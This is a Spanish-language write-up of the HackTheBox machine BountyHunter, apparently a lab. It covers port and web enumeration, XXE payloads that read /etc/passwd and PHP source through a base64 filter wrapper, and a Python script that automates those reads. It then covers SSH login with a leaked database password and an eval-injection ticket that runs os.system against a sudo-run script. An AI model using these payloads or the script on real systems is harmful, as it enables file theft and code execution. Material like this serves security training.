---
icon: desktop
layout:
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
---

# BountyHunter

`BountyHunter` es una máquina Linux sencilla que utiliza la inyección de entidades externas XML para leer archivos del sistema. Poder leer un archivo PHP en el que se filtran las credenciales brinda la oportunidad de obtener un punto de apoyo en el sistema como usuario de desarrollo. Un mensaje de John menciona un contrato con Skytrain Inc y habla de un script que valida los boletos. La auditoría del código fuente del script de Python revela que utiliza la función eval en el código del boleto, que se puede inyectar, y como el script de Python se puede ejecutar como root con sudo por el usuario de desarrollo, es posible obtener un shell de root.

<figure><img src="../../.gitbook/assets/BountyHunter.png" alt="" width="563"><figcaption></figcaption></figure>

***

## Reconnaissance

Realizaremos un reconocimiento con `nmap` para ver los puertos que están expuestos en la máquina **`BountyHunter`**. Este resultado lo almacenaremos en un archivo llamado `allPorts`.

```bash
❯ nmap -p- --open -sS --min-rate 1000 -vvv -Pn -n 10.10.11.100 -oG allPorts
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.95 ( https://nmap.org ) at 2025-03-03 20:13 CET
Initiating SYN Stealth Scan at 20:13
Scanning 10.10.11.100 [65535 ports]
Discovered open port 80/tcp on 10.10.11.100
Discovered open port 22/tcp on 10.10.11.100
Completed SYN Stealth Scan at 20:13, 28.68s elapsed (65535 total ports)
Nmap scan report for 10.10.11.100
Host is up, received user-set (0.067s latency).
Scanned at 2025-03-03 20:13:17 CET for 29s
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 63
80/tcp open  http    syn-ack ttl 63

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 28.84 seconds
           Raw packets sent: 67502 (2.970MB) | Rcvd: 66606 (2.665MB)
```

A través de la herramienta de [`extractPorts`](https://pastebin.com/X6b56TQ8), la utilizaremos para extraer los puertos del archivo que nos generó el primer escaneo a través de `Nmap`. Esta herramienta nos copiará en la clipboard los puertos encontrados.

```bash
❯ extractPorts allPorts

[*] Extracting information...

	[*] IP Address: 10.10.11.100
	[*] Open ports: 22,80

[*] Ports copied to clipboard
```

Lanzaremos scripts de reconocimiento sobre los puertos encontrados y lo exportaremos en formato oN y oX para posteriormente trabajar con ellos. En el resultado, comprobamos que se encuentran abierta una página web de `Apache` y el servicio`SSH`.

```bash
❯ nmap -sCV -p22,80 10.10.11.100 -A -oN targeted -oX targetedXML
Starting Nmap 7.95 ( https://nmap.org ) at 2025-03-03 20:15 CET
Nmap scan report for 10.10.11.100
Host is up (0.035s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 d4:4c:f5:79:9a:79:a3:b0:f1:66:25:52:c9:53:1f:e1 (RSA)
|   256 a2:1e:67:61:8d:2f:7a:37:a7:ba:3b:51:08:e8:89:a6 (ECDSA)
|_  256 a5:75:16:d9:69:58:50:4a:14:11:7a:42:c1:b6:23:44 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Bounty Hunters
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Linux 4.X|5.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
OS details: Linux 4.15 - 5.19, Linux 5.0, Linux 5.0 - 5.14
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 22/tcp)
HOP RTT      ADDRESS
1   34.09 ms 10.10.14.1
2   34.47 ms 10.10.11.100

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 11.29 seconds

```

Transformaremos el archivo generado `targetedXML` para transformar el XML en un archivo HTML para posteriormente montar un servidor web y visualizarlo.

```bash
❯ xsltproc targetedXML > index.html

❯ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

Accederemos a[ http://localhost](http://localhost) y verificaremos el resultado en un formato más cómodo para su análisis.

<figure><img src="../../.gitbook/assets/imagen (11).png" alt=""><figcaption></figcaption></figure>

## Web Enumeration

Realizaremos a través de la herramienta de `whatweb` un reconocimiento inicial de las tecnologías que utiliza la aplicación web.

```bash
❯ whatweb -a 3 http://10.10.11.100/
http://10.10.11.100/ [200 OK] Apache[2.4.41], Bootstrap, Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.41 (Ubuntu)], IP[10.10.11.100], JQuery, Script, Title[Bounty Hunters]
```

Accederemos a [http://10.10.11.100/ ](http://10.10.11.100/)y comprobaremos la siguiente página web, que ofrece 3 páginas de `About`, `Contact` y `Portal`.

<figure><img src="../../.gitbook/assets/imagen (1) (1).png" alt=""><figcaption></figcaption></figure>

Realizaremos una enumeración de directorios y páginas `PHP`. En el resultado obtenido, verificamos diferentes páginas web y directorios los cuales revisaremos posteriormente.

```bash
❯ feroxbuster -u http://10.10.11.100/ -t 200 -C 500,502,404 -x php
                                                                                                                                                                                                                                      
 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.11.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://10.10.11.100/
 🚀  Threads               │ 200
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 💢  Status Code Filters   │ [500, 502, 404]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.11.0
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 💲  Extensions            │ [php]
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
403      GET        9l       28w      277c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
404      GET        9l       31w      274c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
301      GET        9l       28w      310c http://10.10.11.100/css => http://10.10.11.100/css/
301      GET        9l       28w      309c http://10.10.11.100/js => http://10.10.11.100/js/
200      GET       80l      248w     3228c http://10.10.11.100/resources/monsterat.css
200      GET       64l      232w     2682c http://10.10.11.100/resources/lato.css
200      GET      122l      415w    30702c http://10.10.11.100/assets/img/portfolio/cake.png
200      GET      195l      683w    66699c http://10.10.11.100/assets/img/portfolio/cabin.png
200      GET      151l      616w    50204c http://10.10.11.100/assets/img/portfolio/circus.png
200      GET        5l   108280w  1194961c http://10.10.11.100/resources/all.js
200      GET      388l     1470w    25169c http://10.10.11.100/index.php
200      GET       20l       63w      617c http://10.10.11.100/log_submit.php
200      GET        5l       15w      125c http://10.10.11.100/portal.php
301      GET        9l       28w      316c http://10.10.11.100/resources => http://10.10.11.100/resources/
200      GET        1l       44w     2532c http://10.10.11.100/resources/jquery.easing.min.js
200      GET       24l       44w      594c http://10.10.11.100/resources/bountylog.js
200      GET        6l       34w      210c http://10.10.11.100/resources/README.txt
200      GET        2l     1297w    89476c http://10.10.11.100/resources/jquery.min.js
200      GET        7l     1031w    84152c http://10.10.11.100/resources/bootstrap.bundle.min.js
200      GET        7l      567w    48945c http://10.10.11.100/resources/bootstrap_login.min.js
200      GET        4l     1298w    86659c http://10.10.11.100/resources/jquery_login.min.js
301      GET        9l       28w      313c http://10.10.11.100/assets => http://10.10.11.100/assets/
200      GET      388l     1470w    25169c http://10.10.11.100/
301      GET        9l       28w      317c http://10.10.11.100/assets/img => http://10.10.11.100/assets/img/
```

Por otro lado, también realizaremos la misma enumeración pero esta vez a través de la herramienta de `gobuster`. En el resultado obtenido, verificamos diferentes páginas `PHP` como las siguientes:

* portal.php
* db.php
* index.php&#x20;

```bash
❯ gobuster dir -u http://10.10.11.100/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 200 -b 503,404 -x php
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.11.100/
[+] Method:                  GET
[+] Threads:                 200
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   503,404
[+] User Agent:              gobuster/3.6
[+] Extensions:              php
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.php                 (Status: 403) [Size: 277]
/assets               (Status: 301) [Size: 313] [--> http://10.10.11.100/assets/]
/portal.php           (Status: 200) [Size: 125]
/css                  (Status: 301) [Size: 310] [--> http://10.10.11.100/css/]
/db.php               (Status: 200) [Size: 0]
/js                   (Status: 301) [Size: 309] [--> http://10.10.11.100/js/]
/index.php            (Status: 200) [Size: 25169]
/resources            (Status: 301) [Size: 316] [--> http://10.10.11.100/resources/]
```

Al acceder a la sección de `Portal` de la página principal, somos redirigidos a la página web [http://10.10.11.100/portal.php](http://10.10.11.100/portal.php) la cual nos muestra un mensaje indicando que el portal está en desarrollo. También se nos indica que para acceder al `Bounty Tracker` accedamos al hipervínculo que se nos muestra.

<figure><img src="../../.gitbook/assets/imagen (2) (1).png" alt=""><figcaption></figcaption></figure>



Al acceder al enlace, somos redirigidos a la siguiente página web de [http://10.10.11.100/log\_submit.php](http://10.10.11.100/log_submit.php). En la siguiente página web se nos indica un sistema de reporting de `BugBounty` en el cual nos permiten indicar diferentes campos.

<figure><img src="../../.gitbook/assets/5314_vmware_NNQK0l7EVG.png" alt=""><figcaption></figcaption></figure>

## Initial Access

### XXE (XML External Entity Injection) Exploitation

Indicaremos unos datos randoms para verificar el funcionamiento de la aplicación web. Al indicar los datos, se nos muestra en el `output` de la aplicación web el resultado obtenido.

<figure><img src="../../.gitbook/assets/imagen (3) (1).png" alt=""><figcaption></figcaption></figure>

Al interceptar la solicitud con `BurpSuite`, comprobamos que al darle a la opción de `Submit` lo que se tramita es una variable llamada `data` con un código codificado en `Base64`. Al seleccionar el código, la propia herramienta de `BurpSuite` nos lo descodifica automáticamente.

En este caso, al descodificarlo, se nos muestra la estructura de una archivo `XML`, con lo cual, lo primero que se nos ocurre es en intentar probar un `XML External Entity Injection (XXE)`.

<figure><img src="../../.gitbook/assets/imagen (4) (1).png" alt=""><figcaption></figcaption></figure>

Descoficaremos el valor también en `Cyberchef` para comprobar que efectivamente se trata de un archivo `XML` codificado en `Base64` y `URL Encode` para evitar problemas con los carácteres especiales como `=`,`+`, etc.

<figure><img src="../../.gitbook/assets/imagen (5) (1).png" alt=""><figcaption></figcaption></figure>

Probaremos diferentes `payloads` para intentar comprobar si la aplicación web es vulnerable a `XXE`. En este primer intento para comprobar si es vulnerable, lo que realizaremos es codificar el siguiente contenido `XML` en Base64 para ingresarlo en lo que espera la aplicación web que se le indique.

Con este archivo `XXE` comprobaremos si podemos definir una entidad nueva llamada `example` con el contenido `GzzcooXXE` y indicar que se muestre entre las etiquetas `<cwe>` como ejemplo.

{% embed url="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20Injection" %}

```xml
<?xml  version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE replace [<!ENTITY example "GzzcooXXE"> ]>
		<bugreport>
		<title>Gzzcoo</title>
		<cwe>Gzzcoo&example;</cwe>
		<cvss>9.0</cvss>
		<reward>10000</reward>
		</bugreport>
```

<figure><img src="../../.gitbook/assets/imagen (7) (1).png" alt=""><figcaption></figcaption></figure>

Enviaremos en la variable `data` nuestro archivo `XML` malicioso y al enviar la solicitud, en la respuesta por parte del servidor comprobamos que ha interpretado la nueva entidad y se ha mostrado el contenido, con lo cual confirmamos que la aplicación web es vulnerable a `XML External Entity Injection (XXE)`.

{% hint style="warning" %}
El contenido del archivo `XML` debe estar codificado como hemos comentado en `Base64` y también deberemos de aplicar un `URL Encode` para no tener problemas. Para ello, seleccionamos el contenido en `Base64` que hemos indicado en `BurpSuite` y haremos `Ctrl+U`para aplicar el `URL Encode` y no tener problemas con los carácteres especiales, etc.
{% endhint %}

<figure><img src="../../.gitbook/assets/imagen (6) (1).png" alt=""><figcaption></figcaption></figure>

A continuación, el siguiente paso será intentar leer archivos arbitrarios del sistema. La siguiente estructura `XML` la codificaremos en `Base64` y  `URL Encode` y al enviar la solicitud desde `BurpSuite`, comprobaremos que finalmente hemos logrado listar el archivo `/etc/passwd` del servidor vulnerable.&#x20;

Por lo tanto, tenemos una vía potencial de poder leer archivos arbitrarios del sistema.

```xml
<?xml  version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [<!ENTITY myFile SYSTEM 'file:///etc/passwd'>]>
		<bugreport>
		<title>Gzzcoo</title>
		<cwe>&myFile;</cwe>
		<cvss>9.0</cvss>
		<reward>10000</reward>
		</bugreport>
```

<figure><img src="../../.gitbook/assets/imagen (8) (1).png" alt=""><figcaption></figcaption></figure>

### XXE PHP File Read - Base64 Wrapper

El problema con la lectura de archivos en una aplicación web es que, si intentamos leer un archivo `PHP`, este se interpretará y no podremos ver su contenido en texto plano.

Para evitar este comportamiento, podemos usar `wrappers` de `PHP` para codificar el contenido que queremos listar. En este caso, utilizaremos un wrapper que convierte el archivo a `Base64`. Esto nos permite leer archivos `PHP` sin que el servidor los ejecute, ya que la aplicación solo mostrará el contenido codificado como una cadena de texto. Luego, simplemente decodificamos el resultado para obtener el archivo original.

Por ejemplo, al utilizar el siguiente payload, podemos leer el archivo `/etc/passwd`, que se nos devolverá en `Base64`.

```xml
<?xml  version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE replace [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd"> ]>
		<bugreport>
		<title>Gzzcoo</title>
		<cwe>&xxe;</cwe>
		<cvss>9.0</cvss>
		<reward>10000</reward>
		</bugreport>
```

<figure><img src="../../.gitbook/assets/imagen (9) (1).png" alt=""><figcaption></figcaption></figure>

Nos guardaremos el contenido en `Base64` obtenido en el punto anterior y lo guardaremos en un archivo, por ejemplo, `data`.

El siguiente paso, será lograr descodificar el contenido de `Base64` en el cual comprobaremos el archivo original de `/etc/passwd`.

```bash
❯ cat data | base64 -d; echo
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
syslog:x:104:110::/home/syslog:/usr/sbin/nologin
_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:110:1::/var/cache/pollinate:/bin/false
sshd:x:111:65534::/run/sshd:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
development:x:1000:1000:Development:/home/development:/bin/bash
lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
usbmux:x:112:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
```

### Python Script to perform XXE Base 64 Wrapper Exploitation

Para automatizar el proceso de explotación `XXE` sin necesidad de codificar manualmente el archivo `XML` malicioso, enviar la petición a `BurpSuite` y decodificar la respuesta en `Base64`, hemos desarrollado el siguiente script en Python.

Este script construye automáticamente la solicitud a la aplicación web, inyecta una estructura `XML` con `XXE`, recupera la respuesta en `Base64` y la decodifica para mostrar el contenido del archivo objetivo de forma legible.

{% code title="xxe_lfi.py" %}
```python
import requests
import subprocess
import base64
import sys
from bs4 import BeautifulSoup

# Función para crear el payload XML con inyección XXE
def create_xml_payload(file_path):
    # Plantilla XML con XXE usando una variable para la ruta del archivo
    xxe_payload = f'''<!DOCTYPE replace [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource={file_path}"> ]>
    <bugreport>
        <title>&xxe;</title>
        <cwe>CWE</cwe>
        <cvss>9.8</cvss>
        <reward>1,000,000</reward>
    </bugreport>
    '''
    return xxe_payload

# Función para codificar el XML en Base64
def encode_base64(xml_data):
    return base64.b64encode(xml_data.encode('utf-8')).decode('utf-8')

# Función para limpiar las etiquetas HTML de la respuesta
def clean_html(response_text):
    soup = BeautifulSoup(response_text, 'html.parser')
    return soup.get_text()

# Función para decodificar Base64 a texto plano o binario
def decode_base64(encoded_data):
    try:
        # Corregir el padding de Base64
        encoded_data = encoded_data + '=' * (4 - len(encoded_data) % 4)  # Aseguramos que tenga el padding correcto

        decoded_data = base64.b64decode(encoded_data)
        
        # Intentamos decodificar como texto
        try:
            return decoded_data.decode('utf-8')
        except UnicodeDecodeError:
            # Si falla la decodificación en UTF-8, regresamos el contenido binario
            return decoded_data
    except Exception as e:
        print(f"Error decoding base64: {e}")
        return None

# Función principal para realizar la solicitud POST
def send_post_request(file_path):
    # Crear el payload XML con la ruta del archivo
    xml_payload = create_xml_payload(file_path)
    
    # Codificar el XML en Base64
    base64_encoded_data = encode_base64(xml_payload)
    
    # Preparar los headers para la solicitud
    headers = {
        'Host': '10.10.11.100',
        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0',
        'Accept': '*/*',
        'Accept-Language': 'en-US,en;q=0.5',
        'Accept-Encoding': 'gzip, deflate, br',
        'X-Requested-With': 'XMLHttpRequest',
        'Origin': 'http://10.10.11.100',
        'Connection': 'keep-alive',
        'Referer': 'http://10.10.11.100/log_submit.php',
        'Priority': 'u=0',
        'Content-Type': 'application/x-www-form-urlencoded',
        'Content-Length': str(len(base64_encoded_data) + len('data='))
    }

    # Datos del formulario (incluyendo el payload codificado)
    data = {'data': base64_encoded_data}
    
    # URL del endpoint
    url = 'http://10.10.11.100/tracker_diRbPr00f314.php'
    
    # Realizar la solicitud POST
    response = requests.post(url, headers=headers, data=data)
    
    # Limpiar las etiquetas HTML de la respuesta
    cleaned_response = clean_html(response.text)
    
    # Decodificar el contenido Base64 (si la respuesta tiene datos codificados)
    if cleaned_response:
        decoded_response = decode_base64(cleaned_response)
        
        # Verificar si la respuesta es binaria o texto
        if isinstance(decoded_response, bytes):
            # print("Binary data received. Not displaying as text.")
            # Aquí podrías guardar el archivo o procesarlo de alguna manera
            with open('output.txt', 'wb') as f:
                f.write(decoded_response)
           # print("Binary data saved as 'output.txt'.")
        
            #print(f"Decoded Response:\n{decoded_response}")
    else:
        print("No data found in the response.")

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("Usage: python xxe_lfi.py <file_path>")
        sys.exit(1)
    
    # Tomar la ruta del archivo desde los argumentos
    file_path = sys.argv[1]
    
    # Enviar la solicitud POST con la ruta del archivo
    send_post_request(file_path)
    subprocess.run(["cat", "output.txt"])
```
{% endcode %}

Ejecutamos el script con el objetivo de obtener el contenido del archivo `/etc/passwd` y verificar que la herramienta funcione correctamente. Al ejecutar el comando, confirmamos que el script devuelve con éxito el contenido del archivo, lo que demuestra que, al proporcionar la ruta de cualquier archivo, el proceso se realiza automáticamente y obtenemos el resultado esperado.

En el resultado obtenido, comprobamos la existencia de un usuario llamado `developer` que dispone de `bash`.

```bash
❯ python3 xxe_lfi.py /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
syslog:x:104:110::/home/syslog:/usr/sbin/nologin
_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:110:1::/var/cache/pollinate:/bin/false
sshd:x:111:65534::/run/sshd:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
development:x:1000:1000:Development:/home/development:/bin/bash
lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
usbmux:x:112:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
```

Ahora que tenemos la capacidad de leer archivos `PHP` a través de `XXE` combinado con el `wrapper PHP` en `Base64` gracias al script que hemos implementado, podemos automatizar la lectura de archivos sensibles en la aplicación. En la enumeración de la página web, recordamos que, al usar herramientas como `Gobuster`, encontramos una página llamada `db.php`. Este archivo podría contener información valiosa, como la configuración de la base de datos o incluso las credenciales de acceso.

Al ejecutar el script sobre `db.php`, efectivamente hemos obtenido el siguiente contenido, que incluye las credenciales de la base de datos:

```bash
❯ python3 xxe_lfi.py /var/www/html/db.php
<?php
// TODO -> Implement login system with the database.
$dbserver = "localhost";
$dbname = "bounty";
$dbusername = "admin";
$dbpassword = "m19RoAU0hP41A1sTsq6K";
$testuser = "test";
?>
```

Probamos de autenticarnos al `SSH` con estas credenciales y con el usuario `development` que encontramos en el archivo `/etc/passwd` que disponía de `bash` para comprobar si esta contraseña es reutilizada o no.

Finalmente logramos obtener acceso al sistema y logramos visualizar la flag **user.txt**.

```bash
❯ sshpass -p 'm19RoAU0hP41A1sTsq6K' ssh development@10.10.11.100
Welcome to Ubuntu 20.04.2 LTS (GNU/Linux 5.4.0-80-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Mon 03 Mar 2025 10:45:52 PM UTC

  System load:           0.0
  Usage of /:            24.0% of 6.83GB
  Memory usage:          14%
  Swap usage:            0%
  Processes:             215
  Users logged in:       0
  IPv4 address for eth0: 10.10.11.100
  IPv6 address for eth0: dead:beef::250:56ff:fe94:2767


0 updates can be applied immediately.


The list of available updates is more than a week old.
To check for new updates run: sudo apt update

Last login: Wed Jul 21 12:04:13 2021 from 10.10.14.8
development@bountyhunter:~$ cat user.txt 
f07029***********************
```

## Privilege Escalation

### Abusing sudoers privilege

Revisando si el usuario `developer` disponía de algún permiso de `sudoers`, nos encontramos que puede ejecutar como `sudo` sin proporcionar credenciales un script de Python ubicado en `/opt/skytrain_inc/tickerValidator.py`.

```bash
development@bountyhunter:~$ sudo -l
Matching Defaults entries for development on bountyhunter:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User development may run the following commands on bountyhunter:
    (root) NOPASSWD: /usr/bin/python3.8 /opt/skytrain_inc/ticketValidator.py
```

Al acceder al directorio `/opt/skytrain_inc` nos encontramos con un directorio llamado `invalid_tickets` en el cual contenía diferentes archivos con extensión `.md` (Markdown). Comprobamos el contenido de uno de ellos el cual contiene una estructura de `Markdown` con lo que parece ser un ticket con una estructura personalizada.

```bash
development@bountyhunter:/opt/skytrain_inc/invalid_tickets$ ls -l
total 16
-r--r--r-- 1 root root 102 Jul 22  2021 390681613.md
-r--r--r-- 1 root root  86 Jul 22  2021 529582686.md
-r--r--r-- 1 root root  97 Jul 22  2021 600939065.md
-r--r--r-- 1 root root 101 Jul 22  2021 734485704.md

development@bountyhunter:/opt/skytrain_inc/invalid_tickets$ cat 390681613.md 
# Skytrain Inc
## Ticket to New Haven
__Ticket Code:__
**31+410+86**
##Issued: 2021/04/06
#End Ticket
```

Este script valida un archivo de ticket de `Skytrain Inc` verificando ciertas condiciones en su contenido.

1. **Carga del archivo**: El script abre un archivo especificado por el usuario si tiene la extensión `.md`. Si el archivo no es un archivo Markdown, muestra un mensaje de error y termina la ejecución.
2. **Evaluación del ticket**: El script analiza el contenido del archivo en busca de ciertas líneas:
   * La primera línea debe comenzar con `# Skytrain Inc`.
   * La segunda línea debe ser un encabezado con la forma `## Ticket to [destino]`.
   * La línea que contiene `__Ticket Code:__` es identificada para extraer el código del ticket.
   * El código del ticket debe ser un número y, si al dividirlo por 7 da como resto 4, se evalúa su validez usando la expresión contenida en esa línea. Si el valor calculado es mayor que 100, el ticket es considerado válido.
3. **Resultado**: Después de evaluar el ticket, el script imprime si el ticket es válido o no según las condiciones definidas.

En resumen, el script valida un archivo de ticket basado en un formato específico de texto y reglas de validación predefinidas.

{% code title="ticketValidator.py" %}
```python
#Skytrain Inc Ticket Validation System 0.1
#Do not distribute this file.

def load_file(loc):
    if loc.endswith(".md"):
        return open(loc, 'r')
    else:
        print("Wrong file type.")
        exit()

def evaluate(ticketFile):
    #Evaluates a ticket to check for ireggularities.
    code_line = None
    for i,x in enumerate(ticketFile.readlines()):
        if i == 0:
            if not x.startswith("# Skytrain Inc"):
                return False
            continue
        if i == 1:
            if not x.startswith("## Ticket to "):
                return False
            print(f"Destination: {' '.join(x.strip().split(' ')[3:])}")
            continue

        if x.startswith("__Ticket Code:__"):
            code_line = i+1
            continue

        if code_line and i == code_line:
            if not x.startswith("**"):
                return False
            ticketCode = x.replace("**", "").split("+")[0]
            if int(ticketCode) % 7 == 4:
                validationNumber = eval(x.replace("**", ""))
                if validationNumber > 100:
                    return True
                else:
                    return False
    return False

def main():
    fileName = input("Please enter the path to the ticket file.\n")
    ticket = load_file(fileName)
    #DEBUG print(ticket)
    result = evaluate(ticket)
    if (result):
        print("Valid ticket.")
    else:
        print("Invalid ticket.")
    ticket.close

main()
```
{% endcode %}

El script utiliza la función `eval` para evaluar una expresión dentro de un ticket.

Este uso de `eval` permite la ejecución de código arbitrario en el sistema si el contenido del ticket incluye una expresión que pueda ser evaluada, lo cual es un **vector de vulnerabilidad**. En este caso, si el ticket incluye una instrucción maliciosa como la que veremos en el siguiente ejemplo, `eval` ejecutará esa instrucción, permitiendo potencialmente la ejecución de código no deseado en el servidor.

```python
validationNumber = eval(x.replace("**", ""))
```

Aquí se muestra un ticket que explota la vulnerabilidad del script al permitir la ejecución de código arbitrario. Un ticket malicioso podría tener el siguiente formato.

En este ejemplo, el ticket contiene una expresión en la línea `Ticket Code` que, al ser evaluada, no solo realiza una operación matemática, sino que además ejecuta el comando `os.system('id')`, lo que puede permitir ejecutar comandos arbitrarios en el sistema vulnerable.

```markdown
# Skytrain Inc
## Ticket to Exploitville
__Ticket Code:__
**4+__import__('os').system('id')**
##Issued: 2025/03/03
#End Ticket
```

Cuando el script evalúa la expresión del ticket que contiene código malicioso, la instrucción `eval` no sanitiza el contenido, por lo que el comando `__import__('os').system('id')` se ejecutará. Este código malicioso ejecuta el comando `id` en el sistema, lo que devolverá información sobre el usuario actual. La ejecución de este código en el script tendría el siguiente resultado.

El comando `id` es ejecutado en el sistema, lo que potencialmente compromete la seguridad del entorno. En un escenario real, un atacante podría utilizar esta vulnerabilidad para ejecutar comandos maliciosos en el servidor donde se ejecuta el script.

```python
validationNumber = eval("4+__import__('os').system('id')")
```

Al ejecutar el archivo `gzzcoo.md` con el script `ticketValidator.py`, el sistema evalúa el código del ticket que contiene la expresión `31+410+86`. Al ejecutar el script, muestra la siguiente salida.

